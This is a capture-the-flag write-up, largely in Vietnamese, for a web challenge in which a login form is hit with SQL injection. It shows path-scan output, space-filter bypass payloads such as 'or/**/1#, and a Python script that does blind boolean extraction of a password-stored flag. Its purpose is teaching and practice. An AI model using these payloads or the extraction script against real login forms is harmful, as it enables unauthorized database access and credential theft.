Art gallery 2
===
**Category:** Web

**Author:** Nimisha

**Point:** 300(4 solved)

### Description
I'm on the way to open my very own Art Gallery. I can allow you to take a peak if you want. But not everyone though

### Overview
Site có một form đăng nhập và ở trong mã nguồn không cung cấp cho chúng ta thứ gì đặc biệt. Scan path xem nó các path nào được ẩn đi thì nhận được 
```
[00:29:03] 200 -   30B  - /auth.php
[00:29:16] 200 -    0B  - /config.php
[00:29:39] 302 -    0B  - /home.php  ->  index.html
[00:29:44] 200 -  675B  - /index.html
[00:30:26] 403 -  277B  - /server-status
[00:30:26] 403 -  277B  - /server-status/
[00:30:41] 200 -   19B  - /test.php
```
### Solution
Mình thử input username và password là `'` nhưng nhận được là `Incorrect username or password or both??`. Tiếp tục thử với `' or 1=1 -- -` thì nhận được `ofcourse they're blocked` vậy là đã có một số char và function của sql bị block đi => có thể là sql injection.
Tới đây mình bắt đầu fuzz tìm các char và function bị block. Sau một khoảng time để fuzz thì thấy được cái kí tự sau bị block `=,admin` và khoảng trắng.
Payload hiện tại của mình có thể đăng nhập `'or/**/1#`. Khi đăng nhập được thành công với payload này thì kết quả nhận được ở `home.php` là `I know you are looking for something, but it ain't that easy XD` và ở `card.php` nhận được `welcome back` kèm theo username mình input vào.
Tới đây mình nghĩ có lẽ là sql blind phải tìm password và username nào đó trong db hoặc flag nằm trong DB.
Mình sử dụng burp để brute length của password -> `username='or/**/length(password)/**/like/**/$$#` thì nhận được length = 36
Tiếp tục thử brute mấy kí tự đầu của password -> `username='or/**/left(password,1)/**/like/**/"{}"#` thì nhận được chữ s là `welcome` và brute tiếp tục kí tự thứ 2 và 3 thì là `h` và `a` => password là flag. Tới đây rồi thì mình viết một đoạn script để xử lí việc này.

###### Payload
- Poc: `payload_blind.py`
```py
import requests
import string

url = 'http://34.66.139.33/auth.php'
flag = ''
for i in range(1,50):
	for j in string.ascii_letters+string.digits+'_{}':
		print(j,end='\r')
		temp = flag + j
		# print(temp)
		data = {"username":f"""'or/**/left(password,{i})/**/like/**/binary/**/"{temp}"#""","password":"a"}
		# print(data)
		r = requests.post(url=url,data=data,allow_redirects=False)
		# print(r.text)
		if "welcome!!" in r.text:
			flag += j
			print(flag)
			break
```